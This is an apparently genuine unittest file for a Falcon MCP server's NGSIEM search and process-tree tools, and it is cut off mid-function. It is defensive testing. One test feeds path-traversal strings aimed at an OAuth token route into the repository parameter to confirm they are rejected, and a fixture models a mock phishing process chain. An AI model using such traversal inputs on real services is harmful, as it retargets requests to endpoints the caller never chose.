"""
Tests for the NGSIEM module.
"""

import asyncio
import json
import os
import sys
import tomllib
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, patch

from falcon_mcp.modules import ngsiem as ngsiem_module
from falcon_mcp.modules.base import READ_ONLY_ANNOTATIONS
from falcon_mcp.modules.ngsiem import (
    NGSIEMModule,
    _classify_delivery_vector,
    _process_rollup_query,
)
from tests.modules.utils.test_modules import TestModules

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scripts import build_cql_catalog  # noqa: E402


class TestNGSIEMModule(TestModules):
    """Test cases for the NGSIEM module."""

    def setUp(self):
        """Set up test fixtures."""
        self.setup_module(NGSIEMModule)

        # search_ngsiem is async and calls the async offload wrapper command_async.
        # Route it through the sync `command` mock so the existing side_effect /
        # call_args_list assertions (which inspect `command`) keep working. Because
        # every routed call passes through both mocks, `command.call_count` above
        # `command_async.await_count` means the module reached the blocking sync
        # client directly — see test_search_ngsiem_offloads_every_api_call.
        async def _command_async(*args, **kwargs):
            return self.mock_client.command(*args, **kwargs)

        self.mock_client.command_async = AsyncMock(side_effect=_command_async)

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_offloads_every_api_call(self, mock_sleep):
        """Every NGSIEM API call must go through command_async, never sync command.

        search_ngsiem is an async handler, so `offload_to_thread` returns it
        untouched — nothing else moves its Falcon calls off the event loop. A
        direct `self.client.command(...)` here would block the loop and undo the
        concurrency fix, so this fails if any call site reverts to the sync path.
        """
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-123", "hashedQueryOnView": "abc"}},
            {"status_code": 200, "body": {"done": True, "events": [{"aid": "agent-1"}]}},
        ]

        asyncio.run(
            self.module.search_ngsiem(
                query_string="#event_simpleName=ProcessRollup2",
                start="2025-01-01T00:00:00Z",
                repository="search-all",
            )
        )

        self.assertEqual(
            self.mock_client.command_async.await_count,
            self.mock_client.command.call_count,
            "every Falcon call in search_ngsiem must be awaited via command_async; "
            "a count mismatch means a call site uses the blocking sync client",
        )
        self.assertEqual(self.mock_client.command_async.await_count, 2)

    def test_register_tools(self):
        """Test registering tools with the server."""
        expected_tools = [
            "falcon_search_ngsiem",
            "falcon_list_ngsiem_data_connections",
            "falcon_get_ngsiem_data_connection_status",
            "falcon_list_ngsiem_parsers",
            "falcon_list_ngsiem_lookup_files",
            "falcon_get_process_tree",
            "falcon_lookup_cql_function",
        ]
        self.assert_tools_registered(expected_tools)

    def test_register_resources(self):
        """Test registering resources with the server."""
        expected_resources = [
            "falcon_search_ngsiem_cql_guide",
        ]
        self.assert_resources_registered(expected_resources)

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_success(self, mock_sleep):
        """Test search that completes on first poll returns events list."""
        start_response = {
            "status_code": 200,
            "body": {
                "id": "job-123",
                "hashedQueryOnView": "abc",
            },
        }
        poll_response = {
            "status_code": 200,
            "body": {
                "done": True,
                "events": [
                    {"aid": "agent-1", "event": "ProcessRollup2"},
                    {"aid": "agent-2", "event": "DnsRequest"},
                ],
            },
        }
        self.mock_client.command.side_effect = [start_response, poll_response]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="#event_simpleName=ProcessRollup2",
                start="2025-01-01T00:00:00Z",
                repository="search-all",
            )
        )

        # Verify start call
        first_call = self.mock_client.command.call_args_list[0]
        self.assertEqual(first_call[1]["operation"], "StartSearchV1")
        self.assertEqual(first_call[1]["repository"], "search-all")
        self.assertEqual(first_call[1]["body"]["queryString"], "#event_simpleName=ProcessRollup2")
        # Verify start time is converted to epoch milliseconds
        self.assertEqual(first_call[1]["body"]["start"], 1735689600000)  # 2025-01-01T00:00:00Z

        # Verify poll call
        second_call = self.mock_client.command.call_args_list[1]
        self.assertEqual(second_call[1]["operation"], "GetSearchStatusV1")
        self.assertEqual(second_call[1]["search_id"], "job-123")
        self.assertEqual(second_call[1]["repository"], "search-all")

        self.assertIsInstance(result, dict)
        self.assertEqual(len(result["results"]), 2)
        self.assertEqual(result["results"][0]["aid"], "agent-1")
        self.assertEqual(result["results"][1]["event"], "DnsRequest")
        # A populated result carries no guide/hint
        self.assertNotIn("cql_guide", result)
        self.assertNotIn("hint", result)

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_multiple_polls(self, mock_sleep):
        """Test search that requires multiple polls before completion."""
        start_response = {
            "status_code": 200,
            "body": {"id": "job-456"},
        }
        poll_not_done = {
            "status_code": 200,
            "body": {"done": False},
        }
        poll_done = {
            "status_code": 200,
            "body": {
                "done": True,
                "events": [{"aid": "agent-1"}],
            },
        }
        self.mock_client.command.side_effect = [
            start_response,
            poll_not_done,
            poll_not_done,
            poll_done,
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
            )
        )

        # Verify multiple polls occurred (1 start + 3 polls)
        self.assertEqual(self.mock_client.command.call_count, 4)

        # Verify result
        self.assertIsInstance(result, dict)
        self.assertEqual(len(result["results"]), 1)
        self.assertEqual(result["results"][0]["aid"], "agent-1")

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_start_error(self, mock_sleep):
        """Test that a non-200 on StartSearchV1 returns error dict."""
        error_response = {
            "status_code": 403,
            "body": {"errors": [{"message": "Forbidden"}]},
        }
        self.mock_client.command.return_value = error_response

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
            )
        )

        # Verify only one call was made (no polling)
        self.assertEqual(self.mock_client.command.call_count, 1)

        # Verify error response
        self.assertIsInstance(result, dict)
        self.assertIn("error", result)
        self.assertIn("Failed to start NGSIEM search", result["error"])
        # Verify the CQL guide + repair hint reach the model on failure
        self.assertIn("cql_guide", result)
        self.assertIn("CQL", result["cql_guide"])
        self.assertIn("hint", result)
        self.assertEqual(result["query_used"], "aid=abc123")

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_poll_error(self, mock_sleep):
        """Test that a non-200 on GetSearchStatusV1 returns error dict."""
        start_response = {
            "status_code": 200,
            "body": {"id": "job-789"},
        }
        poll_error = {
            "status_code": 500,
            "body": {"errors": [{"message": "Internal server error"}]},
        }
        self.mock_client.command.side_effect = [start_response, poll_error]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
            )
        )

        # Verify error response
        self.assertIsInstance(result, dict)
        self.assertIn("error", result)
        self.assertIn("Failed to poll NGSIEM search status", result["error"])
        # Verify the CQL guide + repair hint reach the model on failure
        self.assertIn("cql_guide", result)
        self.assertIn("hint", result)
        self.assertEqual(result["query_used"], "aid=abc123")

    @patch("falcon_mcp.modules.ngsiem.TIMEOUT_SECONDS", 10)
    @patch("falcon_mcp.modules.ngsiem.POLL_INTERVAL_SECONDS", 5)
    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_timeout(self, mock_sleep):
        """Test that exceeding timeout calls StopSearchV1 and returns error."""
        start_response = {
            "status_code": 200,
            "body": {"id": "job-timeout"},
        }
        poll_not_done = {
            "status_code": 200,
            "body": {"done": False, "metaData": {"processedEvents": 4200, "timeMillis": 9000}},
        }
        stop_response = {
            "status_code": 200,
            "body": {},
        }
        # 1 start + 2 polls (2 * 5s = 10s >= timeout) + 1 stop
        self.mock_client.command.side_effect = [
            start_response,
            poll_not_done,
            poll_not_done,
            stop_response,
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
                repository="search-all",
            )
        )

        # Verify StopSearchV1 was called for cleanup
        stop_call = self.mock_client.command.call_args_list[-1]
        self.assertEqual(stop_call[1]["operation"], "StopSearchV1")
        self.assertEqual(stop_call[1]["id"], "job-timeout")
        self.assertEqual(stop_call[1]["repository"], "search-all")

        # Verify error response uses _format_error_response structure
        self.assertIsInstance(result, dict)
        self.assertIn("error", result)
        self.assertIn("timed out", result["error"])
        self.assertIn("details", result)
        self.assertEqual(result["details"]["job_id"], "job-timeout")
        self.assertEqual(result["details"]["timeout_seconds"], 10)
        # Cleanup outcome and how far the job got before the deadline
        self.assertEqual(result["details"]["stop_status_code"], 200)
        self.assertEqual(result["details"]["last_job_status"]["processed_events"], 4200)
        self.assertEqual(result["details"]["last_job_status"]["duration_ms"], 9000)
        # Verify the CQL guide + repair hint reach the model on timeout
        self.assertIn("cql_guide", result)
        self.assertIn("hint", result)
        self.assertEqual(result["query_used"], "aid=abc123")

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_with_optional_params(self, mock_sleep):
        """Test that end and limit are passed correctly in body."""
        start_response = {
            "status_code": 200,
            "body": {"id": "job-opt"},
        }
        poll_done = {
            "status_code": 200,
            "body": {"done": True, "events": []},
        }
        self.mock_client.command.side_effect = [start_response, poll_done]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
                end="2025-02-06T00:00:00Z",
                repository="investigate_view",
            )
        )

        # Verify start call body includes end (as epoch ms)
        first_call = self.mock_client.command.call_args_list[0]
        body = first_call[1]["body"]
        self.assertEqual(body["end"], 1738800000000)  # 2025-02-06T00:00:00Z in epoch ms

        # Verify repository was passed as top-level kwarg (path variable)
        params = first_call[1]
        self.assertEqual(params["repository"], "investigate_view")

        # Verify empty result returns the dict envelope carrying the CQL guide + hint
        self.assertIsInstance(result, dict)
        self.assertEqual(result["results"], [])
        self.assertIn("cql_guide", result)
        self.assertIn("hint", result)
        self.assertEqual(result["query_used"], "aid=abc123")

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_default_repository(self, mock_sleep):
        """Test that the repository parameter defaults to 'search-all'.

        Note: When calling module methods directly (not through FastMCP), Pydantic
        Field defaults are not auto-resolved. This test verifies the Field definition
        has the correct default, and that passing 'search-all' explicitly works.
        """
        import inspect

        from pydantic.fields import FieldInfo

        sig = inspect.signature(self.module.search_ngsiem)
        repo_param = sig.parameters["repository"]
        self.assertIsInstance(repo_param.default, FieldInfo)
        self.assertEqual(repo_param.default.default, "search-all")

        # Also verify it works when passed explicitly
        start_response = {
            "status_code": 200,
            "body": {"id": "job-default"},
        }
        poll_done = {
            "status_code": 200,
            "body": {"done": True, "events": []},
        }
        self.mock_client.command.side_effect = [start_response, poll_done]

        asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
                repository="search-all",
            )
        )

        first_call = self.mock_client.command.call_args_list[0]
        self.assertEqual(first_call[1]["repository"], "search-all")

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_special_characters_in_query(self, mock_sleep):
        """Test that special characters in query_string pass through safely."""
        start_response = {
            "status_code": 200,
            "body": {"id": "job-special"},
        }
        poll_done = {
            "status_code": 200,
            "body": {"done": True, "events": []},
        }
        self.mock_client.command.side_effect = [start_response, poll_done]

        special_query = '#event_simpleName=ProcessRollup2 | ComputerName="test\'s <host>" | count()'
        result = asyncio.run(
            self.module.search_ngsiem(
                query_string=special_query,
                start="2025-01-01T00:00:00Z",
            )
        )

        # Verify query was passed through unchanged
        first_call = self.mock_client.command.call_args_list[0]
        self.assertEqual(first_call[1]["body"]["queryString"], special_query)

        # Empty events now return the dict envelope; the query is echoed back verbatim
        self.assertIsInstance(result, dict)
        self.assertEqual(result["query_used"], special_query)

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_missing_job_id(self, mock_sleep):
        """Test that a missing job ID in start response returns error."""
        start_response = {
            "status_code": 200,
            "body": {},
        }
        self.mock_client.command.return_value = start_response

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
            )
        )

        # Verify only one call was made (no polling)
        self.assertEqual(self.mock_client.command.call_count, 1)

        # Verify error response uses _format_error_response structure
        self.assertIsInstance(result, dict)
        self.assertIn("error", result)
        self.assertIn("no job ID", result["error"])
        # Verify the CQL guide + repair hint reach the model on failure
        self.assertIn("cql_guide", result)
        self.assertIn("hint", result)
        self.assertEqual(result["query_used"], "aid=abc123")

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_surfaces_job_metadata_on_success(self, mock_sleep):
        """A populated result carries the job metadata, mapped from the real body shape."""
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-meta"}},
            {
                "status_code": 200,
                "body": {
                    "done": True,
                    "cancelled": False,
                    "events": [{"aid": "agent-1"}],
                    "warnings": [],
                    "metaData": {
                        "eventCount": 1,
                        "processedEvents": 189064,
                        "processedBytes": 498887584,
                        "timeMillis": 5799,
                        "isAggregate": False,
                        "queryStart": 1735689600000,  # 2025-01-01T00:00:00Z
                        "queryEnd": 1735693200000,  # 2025-01-01T01:00:00Z
                        "warnings": [],
                        "filterQuery": {"queryString": "#event_simpleName=ProcessRollup2"},
                    },
                },
            },
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="#event_simpleName=ProcessRollup2 | head(1)",
                start="2025-01-01T00:00:00Z",
                repository="search-all",
            )
        )

        job = result["job"]
        self.assertEqual(job["job_id"], "job-meta")
        self.assertEqual(job["repository"], "search-all")
        self.assertEqual(job["event_count"], 1)
        self.assertEqual(job["processed_events"], 189064)
        self.assertEqual(job["processed_bytes"], 498887584)
        self.assertEqual(job["duration_ms"], 5799)
        self.assertIs(job["is_aggregate"], False)
        self.assertIs(job["cancelled"], False)
        self.assertEqual(job["warnings"], [])
        self.assertEqual(job["search_start"], "2025-01-01T00:00:00Z")
        self.assertEqual(job["search_end"], "2025-01-01T01:00:00Z")
        self.assertEqual(result["query_used"], "#event_simpleName=ProcessRollup2 | head(1)")
        self.assertEqual(job["parsed_query"], "#event_simpleName=ProcessRollup2")

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_search_ngsiem_exposes_misparse_on_populated_result(self, mock_sleep):
        """A misparsed query still returns rows, so parsed_query must survive success.

        Live, `| limit 5` returns 147 rows for a query the caller believes caps at 5.
        """
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-misparse"}},
            {
                "status_code": 200,
                "body": {
                    "done": True,
                    "events": [{"aid": f"agent-{i}"} for i in range(147)],
                    "metaData": {
                        "eventCount": 147,
                        "processedEvents": 66067,
                        "filterQuery": {
                            "queryString": "#event_simpleName=ProcessRollup2 | limit | 5"
                        },
                    },
                },
            },
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="#event_simpleName=ProcessRollup2 | limit 5",
                start="2025-01-01T00:00:00Z",
            )
        )

        self.assertEqual(len(result["results"]), 147)
        self.assertEqual(
            result["job"]["parsed_query"], "#event_simpleName=ProcessRollup2 | limit | 5"
        )

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_zero_rows_with_events_scanned_is_reported_as_a_real_negative(self, mock_sleep):
        """A job that scanned events and matched none is stated as a true negative.

        Live, a valid filter on an absent aid scans thousands of events; a misparsed
        query scans zero. So a nonzero scan count settles it.
        """
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-zero"}},
            {
                "status_code": 200,
                "body": {
                    "done": True,
                    "events": [],
                    "metaData": {
                        "eventCount": 0,
                        "processedEvents": 90102,
                        "processedBytes": 23734288,
                        "filterQuery": {"queryString": "#event_simpleName=DnsRequest"},
                    },
                },
            },
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="#event_simpleName=DnsRequest DomainName=*example*",
                start="2025-01-01T00:00:00Z",
            )
        )

        self.assertEqual(result["results"], [])
        self.assertEqual(result["job"]["processed_events"], 90102)
        # The scan count is quoted back, and the verdict is stated, not doubted
        self.assertIn("90,102", result["hint"])
        self.assertIn("a real negative", result["hint"])
        self.assertNotIn("not a confirmed negative", result["hint"])
        self.assertNotIn("it is also how the API reports an invalid query", result["hint"])

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_zero_rows_with_nothing_scanned_stays_unresolved(self, mock_sleep):
        """Zero scanned events is ambiguous, so the hint points at parsed_query.

        Live, both an empty tag partition and a misparse scan zero.
        """
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-unscanned"}},
            {
                "status_code": 200,
                "body": {
                    "done": True,
                    "events": [],
                    "metaData": {
                        "eventCount": 0,
                        "processedEvents": 0,
                        "processedBytes": 0,
                        "filterQuery": {"queryString": "#event_simpleName=ProcessRollupTwo"},
                    },
                },
            },
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="#event_simpleName=ProcessRollupTwo | head(3)",
                start="2025-01-01T00:00:00Z",
            )
        )

        self.assertEqual(result["job"]["processed_events"], 0)
        self.assertIn("not a confirmed negative", result["hint"])
        self.assertIn("parsed_query", result["hint"])
        self.assertIn("cql_guide", result)

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_absent_metadata_reports_none_rather_than_zero(self, mock_sleep):
        """A response without metaData reports None, not a fabricated 0."""
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-bare"}},
            {"status_code": 200, "body": {"done": True, "events": []}},
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
            )
        )

        job = result["job"]
        self.assertIsNone(job["event_count"])
        self.assertIsNone(job["processed_events"])
        self.assertIsNone(job["parsed_query"])
        self.assertIsNone(job["search_start"])
        self.assertIsNone(job["search_end"])
        self.assertIn("not a confirmed negative", result["hint"])

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_warnings_are_merged_from_both_scopes(self, mock_sleep):
        """Warnings from both the job-level and metaData scopes reach the caller."""
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-warn"}},
            {
                "status_code": 200,
                "body": {
                    "done": True,
                    "events": [{"aid": "agent-1"}],
                    "warnings": ["job-level warning"],
                    "metaData": {"warnings": ["query-level warning"]},
                },
            },
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
            )
        )

        self.assertEqual(result["job"]["warnings"], ["job-level warning", "query-level warning"])

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_empty_and_populated_results_share_one_shape(self, mock_sleep):
        """Both outcomes must be the same shape, so a caller needs one parse path."""
        common = ["results", "query_used", "job"]

        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-a"}},
            {"status_code": 200, "body": {"done": True, "events": [{"aid": "agent-1"}]}},
        ]
        populated = asyncio.run(
            self.module.search_ngsiem(query_string="aid=a", start="2025-01-01T00:00:00Z")
        )

        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-b"}},
            {"status_code": 200, "body": {"done": True, "events": []}},
        ]
        empty = asyncio.run(
            self.module.search_ngsiem(query_string="aid=b", start="2025-01-01T00:00:00Z")
        )

        for key in common:
            self.assertIn(key, populated)
            self.assertIn(key, empty)
        self.assertIsInstance(populated["results"], list)
        self.assertIsInstance(empty["results"], list)
        self.assertEqual(sorted(populated["job"]), sorted(empty["job"]))

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_repository_that_would_alter_the_request_path_is_rejected(self, mock_sleep):
        """`repository` reaches a URL path variable, so it must not carry path syntax.

        FalconPy interpolates path variables into the route, and `requests` then
        normalizes the path before sending it. An unencoded separator or dot-segment
        therefore retargets the request: `a/../../oauth2/token` builds
        `/humio/api/v1/repositories/a/../../oauth2/token/queryjobs`, which normalizes
        to `/humio/api/v1/oauth2/token/queryjobs` — a different route than
        StartSearchV1 selected. Reject before any call rather than relying on the SDK.

        The client is wired to succeed, so without the guard this reports a clean
        search result and the assertions fail on that, not on a mock error.
        """
        for repository in (
            "a/../../oauth2/token",
            "search-all/queryjobs",
            "..",
            "../search-all",
            "search\\all",
            "search%2Fall",
        ):
            with self.subTest(repository=repository):
                self.mock_client.command.reset_mock()
                self.mock_client.command.side_effect = [
                    {"status_code": 200, "body": {"id": "job-should-not-run"}},
                    {"status_code": 200, "body": {"done": True, "events": []}},
                ]

                result = asyncio.run(
                    self.module.search_ngsiem(
                        query_string="aid=abc123",
                        start="2025-01-01T00:00:00Z",
                        repository=repository,
                    )
                )

                self.assertIn("error", result)
                self.assertIn("repository", result["error"])
                # The guard is worthless if the request still goes out.
                self.assertEqual(self.mock_client.command.call_count, 0)

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_repository_rejection_does_not_offer_the_cql_guide(self, mock_sleep):
        """A bad `repository` is not a CQL mistake, so it must not ship the CQL guide.

        Every other error path here routes through `_format_cql_error_response`, which
        attaches the full guide and tells the model to correct its query. Doing that
        for an argument error would send the model to rewrite a query that was fine.
        """
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-should-not-run"}},
            {"status_code": 200, "body": {"done": True, "events": []}},
        ]

        result = asyncio.run(
            self.module.search_ngsiem(
                query_string="aid=abc123",
                start="2025-01-01T00:00:00Z",
                repository="a/../../oauth2/token",
            )
        )

        self.assertIn("error", result)
        self.assertNotIn("cql_guide", result)
        self.assertNotIn("hint", result)

    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_documented_repository_names_still_pass_the_guard(self, mock_sleep):
        """The guard must not reject the repositories the tool advertises.

        The field description names these and says custom views may also be passed,
        so an over-strict rule would break normal use. This is the counterweight to
        the rejection test above.
        """
        for repository in (
            "search-all",
            "investigate_view",
            "xdr",
            "third-party",
            "falcon_for_it_view",
            "forensics_view",
        ):
            with self.subTest(repository=repository):
                self.mock_client.command.reset_mock()
                self.mock_client.command.side_effect = [
                    {"status_code": 200, "body": {"id": "job-ok"}},
                    {"status_code": 200, "body": {"done": True, "events": []}},
                ]

                result = asyncio.run(
                    self.module.search_ngsiem(
                        query_string="aid=abc123",
                        start="2025-01-01T00:00:00Z",
                        repository=repository,
                    )
                )

                self.assertNotIn("error", result)
                self.assertEqual(self.mock_client.command.call_count, 2)


class TestNGSIEMManagementTools(TestModules):
    """Test cases for the read-only NGSIEM pipeline tools."""

    def setUp(self):
        """Set up test fixtures."""
        self.setup_module(NGSIEMModule)

    def test_new_tools_are_read_only(self):
        """Every pipeline tool registers with the default read-only annotations."""
        self.module.register_tools(self.mock_server)
        for name in (
            "falcon_list_ngsiem_data_connections",
            "falcon_get_ngsiem_data_connection_status",
            "falcon_list_ngsiem_parsers",
            "falcon_list_ngsiem_lookup_files",
        ):
            with self.subTest(tool=name):
                self.assert_tool_annotations(name, READ_ONLY_ANNOTATIONS)

    def test_list_data_connections(self):
        """Data connections come from one combined GET with filter, sort and paging."""
        self.mock_client.command.return_value = {
            "status_code": 200,
            "body": {
                "meta": {"pagination": {"offset": 0, "limit": 50, "total": 1}},
                "resources": [{"id": "conn-1", "name": "Okta", "status": "Active"}],
            },
        }

        result = self.module.list_ngsiem_data_connections(
            filter="status:'Active'", limit=50, offset=0, sort="name.asc"
        )

        self.mock_client.command.assert_called_once_with(
            "ExternalListDataConnections",
            parameters={"filter": "status:'Active'", "limit": 50, "offset": 0, "sort": "name.asc"},
        )
        self.assertEqual(result["results"], [{"id": "conn-1", "name": "Okta", "status": "Active"}])
        self.assertEqual(result["pagination"]["total"], 1)
        self.assertEqual(result["filter_used"], "status:'Active'")

    def test_list_data_connections_omits_unset_params(self):
        """Unset optional params are not sent, and no pagination reports total as None."""
        self.mock_client.command.return_value = {"status_code": 200, "body": {"resources": []}}

        result = self.module.list_ngsiem_data_connections(
            filter=None, limit=100, offset=None, sort=None
        )

        self.mock_client.command.assert_called_once_with(
            "ExternalListDataConnections", parameters={"limit": 100}
        )
        self.assertEqual(result["results"], [])
        self.assertIsNone(result["pagination"]["total"])

    def test_list_data_connections_error(self):
        """A failed call returns the error in a list."""
        self.mock_client.command.return_value = {
            "status_code": 403,
            "body": {"errors": [{"message": "access denied"}]},
        }

        result = self.module.list_ngsiem_data_connections(
            filter=None, limit=100, offset=None, sort=None
        )

        self.assertIsInstance(result, list)
        self.assertIn("error", result[0])

    def test_get_data_connection_status(self):
        """Status is a GET with the connection IDs in the query string."""
        self.mock_client.command.return_value = {
            "status_code": 200,
            "body": {"resources": [{"id": "conn-1", "status": "Provisioned"}]},
        }

        result = self.module.get_ngsiem_data_connection_status(ids=["conn-1", "conn-2"])

        self.mock_client.command.assert_called_once_with(
            "ExternalGetDataConnectionStatus", parameters={"ids": ["conn-1", "conn-2"]}
        )
        self.assertEqual(result, [{"id": "conn-1", "status": "Provisioned"}])

    def test_get_data_connection_status_error(self):
        """A failed status call returns an error dict."""
        self.mock_client.command.return_value = {
            "status_code": 404,
            "body": {"errors": [{"message": "not found"}]},
        }

        result = self.module.get_ngsiem_data_connection_status(ids=["missing"])

        self.assertIn("error", result)

    def test_list_parsers(self):
        """Parsers always target the parsers repository and send update_available as a string."""
        self.mock_client.command.return_value = {
            "status_code": 200,
            "body": {"resources": ["okta-parser", "zscaler-parser"]},
        }

        result = self.module.list_ngsiem_parsers(
            filter="name:~'okta'",
            parser_type="custom",
            update_available=True,
            limit=10,
            offset=None,
        )

        self.mock_client.command.assert_called_once_with(
            "ListParsers",
            parameters={
                "repository": "parsers-repository",
                "filter": "name:~'okta'",
                "parser_type": "custom",
                "update_available": "true",
                "limit": 10,
            },
        )
        self.assertEqual(result["results"], ["okta-parser", "zscaler-parser"])

    def test_list_parsers_update_available_false(self):
        """False is sent as the string 'false', not dropped."""
        self.mock_client.command.return_value = {"status_code": 200, "body": {"resources": []}}

        self.module.list_ngsiem_parsers(
            filter=None, parser_type=None, update_available=False, limit=100, offset=None
        )

        params = self.mock_client.command.call_args.kwargs["parameters"]
        self.assertEqual(params["update_available"], "false")
        self.assertNotIn("parser_type", params)

    def test_list_parsers_rejects_unknown_parser_type(self):
        """An unknown parser type is rejected before any API call."""
        result = self.module.list_ngsiem_parsers(
            filter=None, parser_type="ootb'", update_available=None, limit=100, offset=None
        )

        self.mock_client.command.assert_not_called()
        self.assertIsInstance(result, list)
        self.assertIn("Invalid parser_type", result[0]["error"])

    def test_list_lookup_files(self):
        """Lookup files are listed per search domain and may come back as bare names."""
        self.mock_client.command.return_value = {
            "status_code": 200,
            "body": {
                "meta": {"pagination": {"offset": 0, "limit": 100, "total": 2}},
                "resources": ["allowlist.csv", "vip_users.csv"],
            },
        }

        result = self.module.list_ngsiem_lookup_files(
            search_domain="third-party", filter=None, limit=100, offset=None
        )

        self.mock_client.command.assert_called_once_with(
            "ListLookupFiles",
            parameters={"search_domain": "third-party", "limit": 100},
        )
        self.assertEqual(result["results"], ["allowlist.csv", "vip_users.csv"])
        self.assertEqual(result["pagination"]["total"], 2)

    def test_list_lookup_files_rejects_unknown_search_domain(self):
        """A search domain outside the documented set is rejected before any API call."""
        result = self.module.list_ngsiem_lookup_files(
            search_domain="search-all", filter=None, limit=100, offset=None
        )

        self.mock_client.command.assert_not_called()
        self.assertIsInstance(result, list)
        self.assertIn("Invalid search_domain", result[0]["error"])

    def test_list_lookup_files_error(self):
        """A failed call returns the error in a list."""
        self.mock_client.command.return_value = {
            "status_code": 500,
            "body": {"errors": [{"message": "boom"}]},
        }

        result = self.module.list_ngsiem_lookup_files(
            search_domain="all", filter=None, limit=100, offset=None
        )

        self.assertIsInstance(result, list)
        self.assertIn("error", result[0])


AID = "0123456789abcdef0123456789abcdef"
PIVOT_TIME = "2025-01-01T12:00:00Z"
PIVOT_MS = 1735732800000
MAIL_CACHE_DOC = (
    '"C:\\Program Files\\Microsoft Office\\WINWORD.EXE" /n '
    '"C:\\Users\\a\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\X1\\inv.docm"'
)


def _pr2(pid, ppid, image, start_seconds, command_line=None, **extra):
    """A ProcessRollup2 event as select() returns it: every value a string."""
    event = {
        "@timestamp": str(int(start_seconds * 1000)),
        "aid": AID,
        "TargetProcessId": pid,
        "ParentProcessId": ppid,
        "RawProcessId": "4242",
        "ImageFileName": f"\\Device\\HarddiskVolume3\\Windows\\{image}",
        "CommandLine": command_line or image,
        "ProcessStartTime": f"{start_seconds:.3f}",
    }
    event.update(extra)
    return {key: value for key, value in event.items() if value is not None}


def _started(job_id):
    return {"status_code": 200, "body": {"id": job_id}}


def _done(events):
    return {"status_code": 200, "body": {"done": True, "events": events}}


# Seconds since the epoch for PIVOT_TIME.
T0 = PIVOT_MS / 1000

# outlook.exe -> winword.exe -> powershell.exe (pivot) -> cmd.exe -> whoami.exe
PHISHING_CHAIN = [
    _pr2("10", "1", "outlook.exe", T0 - 300),
    _pr2("20", "10", "winword.exe", T0 - 200, MAIL_CACHE_DOC),
    _pr2("30", "20", "powershell.exe", T0 - 100, "powershell -enc AAAA"),
    _pr2("40", "30", "cmd.exe", T0 - 50),
    _pr2("50", "40", "whoami.exe", T0 - 40),
    _pr2("60", "99", "notepad.exe", T0 - 30),
]


class TestProcessTree(TestModules):
    """Test cases for falcon_get_process_tree."""

    def setUp(self):
        self.setup_module(NGSIEMModule)

        async def _command_async(*args, **kwargs):
